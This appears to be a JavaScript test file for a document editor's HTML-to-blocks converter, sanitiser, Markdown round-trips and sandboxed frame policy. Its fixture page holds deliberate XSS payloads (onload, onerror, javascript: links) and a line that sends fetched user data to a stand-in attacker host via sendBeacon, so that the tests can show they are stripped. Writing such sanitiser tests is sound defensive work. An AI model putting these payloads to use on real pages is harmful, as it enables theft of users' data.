// DOCS-RICH: rich doc blocks on the API side (built dist): the block checks, "Turn into doc blocks" on an analysis page
// like the ones Claude makes, the sanitiser with toggles and columns, Markdown both ways, pages sent inline becoming files,
// one block changed in place, and the sealed frame's policy. Every value is synthetic.
import assert from "node:assert/strict";
import test from "node:test";
import { cleanBlock, blocksIn } from "../dist/doc-blocks.js";
// The converter needs acorn and htmlparser2 (DOCS-RICH's dependencies); a checkout installed before them skips its two tests.
let convertHtmlPage = null, missing = '';
try { ({ convertHtmlPage } = await import("../dist/doc-html.js")); } catch (e) { if (e?.code !== "ERR_MODULE_NOT_FOUND") throw e; missing = `acorn and htmlparser2 are not installed in this checkout (bash ~/work/pulse/lane-deps.sh): ${String(e.message).slice(0, 80)}`; }
import { FRAME_CSP, framePage, HEIGHT_SCRIPT, replaceBlock, storePages, takePagesHtml, takePagesMarkdown } from "../dist/doc-rich.js";
import { cleanHtml, htmlToMarkdown, markdownToHtml } from "../dist/docs.js";

const PAGE = `<!doctype html><html><head><title>Pipeline analysis (synthetic)</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script><script src="https://cdn.plot.ly/plotly-2.35.2.min.js"></script>
<style>.kpi{padding:8px}</style></head><body onload="steal()">
<h1>Pipeline analysis</h1><p>October was <strong>steady</strong>, with <a href="https://example.com/x">notes</a> and <a href="javascript:alert(1)">a trap</a>.</p>
<div class="kpis"><div class="kpi"><div class="v">₹42.6 L</div><div class="l">Revenue</div><div class="d">+12% vs Sep</div></div>
  <div class="kpi"><div class="v">318</div><div class="l">Leads</div><div class="d">-4% vs Sep</div></div>
  <div class="kpi"><div class="v">9.4%</div><div class="l">Win rate</div></div></div>
<h2>Revenue by month</h2><canvas id="rev"></canvas>
<h2>Share by city</h2><div id="share"></div>
<h2>Leads table</h2><table><thead><tr><th>City</th><th>Leads</th></tr></thead><tbody><tr><td>Pune</td><td>96</td></tr><tr><td>Mumbai</td><td>78</td></tr></tbody></table>
<ul><li>Pune leads <em>grew</em><ul><li>Qualified enquiries</li></ul></li><li>Mumbai steady</li></ul>
<button onclick="x()">Filter</button><svg width="10" height="10"><circle r="4"/></svg><iframe src="https://evil.example"></iframe>
<img src="x" onerror="alert(1)"><img src="https://img.example/chart.png" alt="A picture">
<script>
const months = ['Jul','Aug','Sep','Oct'];
const ctx = document.getElementById('rev').getContext('2d');
new Chart(ctx, { type: 'line', data: { labels: months, datasets: [ { label: 'Revenue', data: [31.2, 34, 38, 42.6], fill: true }, { label: 'Cost', data: [20, 21.5, 22, 23.1] } ] },
  options: { plugins: { title: { display: true, text: 'Revenue vs cost (₹ lakh)' } }, scales: { y: { ticks: { callback: (v) => v + 'L' } } } } });
Plotly.newPlot('share', [{ type: 'pie', labels: ['Pune', 'Mumbai', 'Delhi'], values: [96, 78, 62] }], { title: { text: 'Leads by city' } });
d3.select('#nothing').data(compute()).enter();
new Chart(document.getElementById('gone'), makeConfig());
fetch('/api/v0/me').then(r => r.json()).then(d => navigator.sendBeacon('https://evil.example', JSON.stringify(d)));
</script></body></html>`;

test("Turn into doc blocks: words, headings, tables, big numbers and charts become the doc's own blocks; nothing of the page runs", { skip: missing || false }, () => {
  const out = convertHtmlPage(PAGE);
  assert.equal(out.title, "Pipeline analysis (synthetic)");
  const html = cleanHtml(out.html);
  for (const bad of ["<script", "onload", "onclick", "onerror", "javascript:", "<iframe", "<button", "<svg", "<canvas", "steal()", "evil.example", "sendBeacon"]) assert.ok(!html.includes(bad), `no ${bad}`);
  assert.match(html, /<h1>Pipeline analysis<\/h1>/);
  assert.match(html, /<strong>steady<\/strong>/);
  assert.match(html, /<a href="https:\/\/example.com\/x"[^>]*>notes<\/a>/);
  assert.match(html, /<table><tbody><tr><th><p>City<\/p><\/th>/);
  assert.match(html, /<ul><li><p>Pune leads <em>grew<\/em><\/p><ul><li><p>Qualified enquiries<\/p>/);
  assert.match(html, /<img src="https:\/\/img.example\/chart.png"/);
  const blocks = blocksIn(html);
  const stat = blocks.find((b) => b.kind === "stat");
  assert.deepEqual(stat.items.map((x) => [x.value, x.label, x.delta, x.tone]), [["₹42.6 L", "Revenue", "+12% vs Sep", "good"], ["318", "Leads", "-4% vs Sep", "bad"], ["9.4%", "Win rate", "", "neutral"]]);
  const charts = blocks.filter((b) => b.kind === "chart");
  assert.equal(charts.length, 2);
  assert.deepEqual([charts[0].type, charts[0].title, charts[0].columns], ["area", "Revenue vs cost (₹ lakh)", ["Label", "Revenue", "Cost"]]);
  assert.deepEqual(charts[0].rows, [["Jul", 31.2, 20], ["Aug", 34, 21.5], ["Sep", 38, 22], ["Oct", 42.6, 23.1]]);
  assert.deepEqual([charts[1].type, charts[1].title, charts[1].rows], ["pie", "Leads by city", [["Pune", 96], ["Mumbai", 78], ["Delhi", 62]]]);
  // each chart sits where its canvas or div was: after its heading, before the next
  assert.ok(html.indexOf("Revenue by month") < html.indexOf('data-id="' + charts[0].id) && html.indexOf('data-id="' + charts[0].id) < html.indexOf("Share by city"));
  assert.equal(out.found.charts, 2); assert.equal(out.found.tables, 1); assert.equal(out.found.numbers, 1);
  assert.equal(out.found.skipped.charts, 1, "a chart whose data needs running code is counted, not read");
  assert.ok(out.found.skipped.controls >= 1 && out.found.skipped.drawings >= 1);
});

test("charts from ECharts, Vega-Lite and data kept in a JSON script are read too", { skip: missing || false }, () => {
  const page = `<body><div id="e"></div><div id="v"></div><script type="application/json" id="data">{"q":[["Q1",4],["Q2",6]]}</script><script>
    const c = echarts.init(document.getElementById('e'));
    c.setOption({ title: { text: 'Calls' }, xAxis: { type: 'category', data: ['Mon', 'Tue'] }, yAxis: {}, series: [{ type: 'bar', name: 'Calls', data: [12, -3] }] });
    vegaEmbed('#v', { title: 'Visits', data: { values: [{ d: 'A', n: 1, s: 'web' }, { d: 'A', n: 2, s: 'app' }, { d: 'B', n: 3, s: 'web' }] }, mark: 'line', encoding: { x: { field: 'd' }, y: { field: 'n' }, color: { field: 's' } } });
    const raw = JSON.parse(document.getElementById('data').textContent);
  </script></body>`;
  const charts = blocksIn(cleanHtml(convertHtmlPage(page).html)).filter((b) => b.kind === "chart");
  assert.deepEqual(charts.map((c) => [c.type, c.title]), [["bar", "Calls"], ["line", "Visits"]]);
  assert.deepEqual(charts[0].rows, [["Mon", 12], ["Tue", -3]]);
  assert.deepEqual(charts[1].columns, ["d", "web", "app"]);
  assert.deepEqual(charts[1].rows, [["A", 1, 2], ["B", 3, null]]);
});

test("rich blocks are checked data: a chart table capped and numeric, a diagram without init directives, a page only by its file", () => {
  const c = cleanBlock({ kind: "chart", type: "pie", title: "<img src=x onerror=alert(1)>", columns: ["City", "Leads", ...Array(20).fill("x")], rows: [["Pune", "96"], ["Mumbai", "seventy"], "junk"], stacked: true, horizontal: true, evil: "x" });
  assert.equal(c.type, "pie"); assert.equal(c.columns.length, 12); assert.deepEqual(c.rows[0].slice(0, 2), ["Pune", 96]); assert.equal(c.rows[1][1], null);
  assert.equal(c.rows.length, 2); assert.ok(!("stacked" in c) && !("horizontal" in c) && !("evil" in c));
  assert.equal(c.title, "<img src=x onerror=alert(1)>", "kept as words; drawn as text, never as HTML");
  assert.deepEqual(cleanBlock({ kind: "chart", rows: [{ label: "This week", value: 3 }] }).columns, ["Name", "Value"], "the first bar chart's rows are read");
  const d = cleanBlock({ kind: "diagram", code: '%%{init: {"securityLevel":"loose"}}%%\nflowchart TD\n  A-->B\u0000' });
  assert.equal(d.code, "flowchart TD\n  A-->B");
  const p = cleanBlock({ kind: "html", title: "Page", source: "<script>alert(1)</script>", fileId: "not-an-id", height: 99999 });
  assert.deepEqual(Object.keys(p).sort(), ["height", "id", "kind", "title"], "no source and no bad file id survive");
  assert.equal(p.height, 4000);
  const s = cleanBlock({ kind: "stat", items: [{ value: "₹4 L", label: "Revenue", tone: "great" }, { label: "no value" }] });
  assert.deepEqual(s.items, [{ value: "₹4 L", label: "Revenue", delta: "", tone: "neutral" }]);
});

test("toggles and columns survive the sanitiser and Markdown both ways; their attributes cannot carry code", () => {
  const html = '<details data-type="toggle" open onclick="x()"><summary>Method</summary><div data-type="toggle-content" style="x"><p>How we counted.</p></div></details>'
    + '<div data-type="columns" data-count="7" onmouseover="x()"><div data-type="column"><h2>Left</h2></div><div data-type="column"><p>Right</p></div></div>';
  const clean = cleanHtml(html);
  assert.equal(clean, '<details data-type="toggle" open><summary>Method</summary><div data-type="toggle-content"><p>How we counted.</p></div></details>'
    + '<div data-type="columns" data-count="2"><div data-type="column"><h2>Left</h2></div><div data-type="column"><p>Right</p></div></div>');
  const md = htmlToMarkdown(clean);
  assert.match(md, /<details data-type="toggle">\n<summary>Method<\/summary><div data-type="toggle-content">\n\nHow we counted.\n\n<\/div><\/details>/);
  assert.match(md, /<div data-type="columns" data-count="2">\n<div data-type="column">\n\n## Left\n\n<\/div>/);
  const back = cleanHtml(markdownToHtml(md)).replace(/\n/g, "");
  assert.match(back, /<details data-type="toggle"><summary>Method<\/summary><div data-type="toggle-content"><p>How we counted.<\/p><\/div><\/details>/);
  assert.match(back, /<div data-type="columns" data-count="2"><div data-type="column"><h2>Left<\/h2><\/div><div data-type="column"><p>Right<\/p><\/div><\/div>/);
});

test("a chart block written in Markdown by an agent comes back the same", () => {
  const md = '# Review\n\n```pulse-block\n{"kind":"chart","id":"b_rev123","type":"bar","title":"Leads","unit":"","columns":["City","Leads"],"rows":[["Pune",96],["Delhi",-2]],"stacked":true}\n```\n';
  const b = blocksIn(cleanHtml(markdownToHtml(md)))[0];
  assert.deepEqual(b, { kind: "chart", id: "b_rev123", type: "bar", title: "Leads", unit: "", columns: ["City", "Leads"], rows: [["Pune", 96], ["Delhi", -2]], stacked: true });
  assert.match(htmlToMarkdown(cleanHtml(markdownToHtml(md))), /```pulse-block\n\{"kind":"chart","id":"b_rev123"/);
});

test("a page sent inside a block becomes the doc's file; the body keeps only its id", async () => {
  const page = "<!doctype html><html><head></head><body><h1>Hi</h1><script>1</script></body></html>";
  const md = takePagesMarkdown('Intro\n\n```pulse-block\n' + JSON.stringify({ kind: "html", title: "Pipeline", source: page }) + '\n```\n');
  const html = cleanHtml(markdownToHtml(md));
  const b = blocksIn(html)[0];
  assert.equal(b.kind, "html"); assert.match(b.fileId, /^[0-9a-f-]{36}$/); assert.ok(!html.includes("<h1>Hi"), "the page is not in the body");
  const calls = [];
  await storePages({ query: async (sql, args) => { calls.push({ sql, args }); return { rows: [] }; } }, "11111111-1111-4111-8111-111111111111", html);
  assert.equal(calls.length, 1);
  assert.match(calls[0].sql, /insert into pulse\.doc_file/);
  assert.deepEqual(calls[0].args.slice(0, 3), [b.fileId, "11111111-1111-4111-8111-111111111111", "Pipeline.html"]);
  assert.equal(calls[0].args[5].toString("utf8"), page);
  await storePages({ query: async () => assert.fail("stored twice") }, "11111111-1111-4111-8111-111111111111", html);
  // the same through HTML (single or double quotes)
  const h = takePagesHtml(`<div data-type="pulse-block" data-block='${JSON.stringify({ kind: "html", html: page })}'></div>`);
  assert.match(blocksIn(cleanHtml(h))[0].fileId, /^[0-9a-f-]{36}$/);
});

test("update_doc_block changes one block, keeps its kind and id, and refuses an unknown id", () => {
  const html = cleanHtml(markdownToHtml('```pulse-block\n{"kind":"chart","id":"b_one123","type":"bar","columns":["A","B"],"rows":[["x",1]]}\n```\n\nWords\n\n```pulse-block\n{"kind":"diagram","id":"b_two123","code":"graph TD"}\n```'));
  const { html: next, block } = replaceBlock(html, "b_one123", { type: "line", kind: "diagram", id: "b_evil", rows: [["x", 2], ["y", 3]] });
  assert.deepEqual([block.kind, block.id, block.type, block.rows], ["chart", "b_one123", "line", [["x", 2], ["y", 3]]]);
  assert.equal(blocksIn(next)[1].code, "graph TD"); assert.match(next, /Words/);
  assert.throws(() => replaceBlock(html, "b_nothere", {}), /not in this doc/);
});

test("the sealed frame: its policy, and the height script placed after the doctype and head", () => {
  for (const part of ["sandbox allow-scripts", "default-src 'none'", "connect-src 'none'", "form-action 'none'", "frame-ancestors 'self'", "base-uri 'none'", "img-src data: blob:"]) assert.ok(FRAME_CSP.includes(part), part);
  assert.ok(!/allow-same-origin|allow-top-navigation|allow-forms|allow-popups/.test(FRAME_CSP));
  const p = framePage("<!DOCTYPE html><html><head><title>x</title></head><body></body></html>");
  assert.ok(p.startsWith("<!DOCTYPE html><html><head>" + HEIGHT_SCRIPT + "<title>"), p.slice(0, 80));
  assert.ok(framePage("<p>bare</p>").startsWith(HEIGHT_SCRIPT));
  assert.match(HEIGHT_SCRIPT, /postMessage\(\{pulseFrame:"height",height:h\},"\*"\)/);
  assert.ok(!/cookie|localStorage|fetch|XMLHttpRequest/.test(HEIGHT_SCRIPT), "the added script only measures");
});
